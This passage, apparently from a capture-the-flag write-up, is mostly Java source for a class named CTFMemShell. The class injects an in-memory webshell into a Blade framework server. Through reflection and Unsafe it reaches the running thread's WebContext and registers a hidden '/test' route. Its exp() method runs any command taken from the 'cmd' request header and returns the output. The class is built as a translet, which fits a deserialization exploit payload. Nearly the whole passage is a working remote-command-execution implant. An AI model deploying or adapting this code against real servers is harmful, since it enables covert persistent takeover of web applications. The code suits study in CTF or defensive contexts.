            for (int i = 0; i < Array.getLength(table); i++) {
                try {
                    Object o1 = Array.get(table, i);
                    System.out.println(o1.getClass().getName());
                    if(o1.getClass().getName().equals("java.lang.ThreadLocal$ThreadLocalMap$Entry")
                    ){
                        o = Array.get(table, i);
                    }
                }catch (Exception e) {
                }
            }
            System.out.println(o);
            Class<?> entry = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field valueField = entry.getDeclaredField("value");
            valueField.setAccessible(true);
            InternalThreadLocalMap value = (InternalThreadLocalMap)
                    valueField.get(o);
            WebContext context = null;
            for (int i = 0; i < value.size(); i++) {
                try {
                    if (value.indexedVariable(i).getClass().getName().equals("com.hellokaton.blade.mvc.WebContext")) {
                        context = (WebContext) value.indexedVariable(i);
                        break;
                    }
                }catch (Exception e) {
                }
            }
            ChannelHandlerContext channelHandlerContext = context.getChannelHandlerContext();
            HttpServerHandler handler = (HttpServerHandler) channelHandlerContext.handler();
            RouteMethodHandler routeHandler = (RouteMethodHandler) unsafe.getObject(handler, unsafe.objectFieldOffset(HttpServerHandler.class.getDeclaredField("routeHandler")));
            RouteMatcher routeMatcher = (RouteMatcher) unsafe.getObject(routeHandler, unsafe.objectFieldOffset(RouteMethodHandler.class.getDeclaredField("routeMatcher")));
            Path annotation = CTFMemShell.class.getAnnotation(Path.class);
            System.out.println("annotations: " + annotation);
            Route route = new Route(HttpMethod.ALL, "/test", CTFMemShell.class, CTFMemShell.class.getDeclaredMethod("exp"));
            route.setTarget(new CTFMemShell());
            Method addRoute = routeMatcher.getClass().getDeclaredMethod("addRoute", Route.class);
            addRoute.setAccessible(true);
            addRoute.invoke(routeMatcher,route);
            System.out.println(routeHandler);
            StaticMapping staticMapping = routeMatcher.getStaticMapping();
            staticMapping.addRoute("/test",HttpMethod.ALL,route);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public CTFMemShell(){
    }
    public void exp() throws Exception{
        Class<?> name = Class.forName("sun.misc.Unsafe");
        Field theUnsafe = name.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Thread thread = Thread.currentThread();
        ThreadLocal<Object> objectThreadLocal = new ThreadLocal<>();
        Method getMap = ThreadLocal.class.getDeclaredMethod("getMap",Thread.class);
        getMap.setAccessible(true);
        Object threadLocals = getMap.invoke(objectThreadLocal, thread);
        Class<?> threadLocalMap =
                Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
        Field tablesFiled = threadLocalMap.getDeclaredField("table");
        tablesFiled.setAccessible(true);
        Object table = tablesFiled.get(threadLocals);
        Object o = null;
        for (int i = 0; i < Array.getLength(table); i++) {
            try {
                Object o1 = Array.get(table, i);
                if(o1.getClass().getName().equals("java.lang.ThreadLocal$ThreadLocalMap$Entry")){
                    o = Array.get(table, i);
                }
            }catch (Exception e) {
            }
        }
        System.out.println(o);
        Class<?> entry =
                Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        Field valueField = entry.getDeclaredField("value");
        valueField.setAccessible(true);
        InternalThreadLocalMap value = (InternalThreadLocalMap) valueField.get(o);
        WebContext context = null;
        for (int i = 0; i < value.size(); i++) {
            try {
                if
                (value.indexedVariable(i).getClass().getName().equals("com.hellokaton.blade.mvc.WebContext")) {
                    context = (WebContext) value.indexedVariable(i);
                    break;
                }
            }catch (Exception e) {
            }
        }
        HttpResponse response = (HttpResponse) context.getResponse();
        Request request = context.getRequest();
        String cmd = request.header("cmd");
        response.body(new
                Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
    }



    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250827192252443.png)

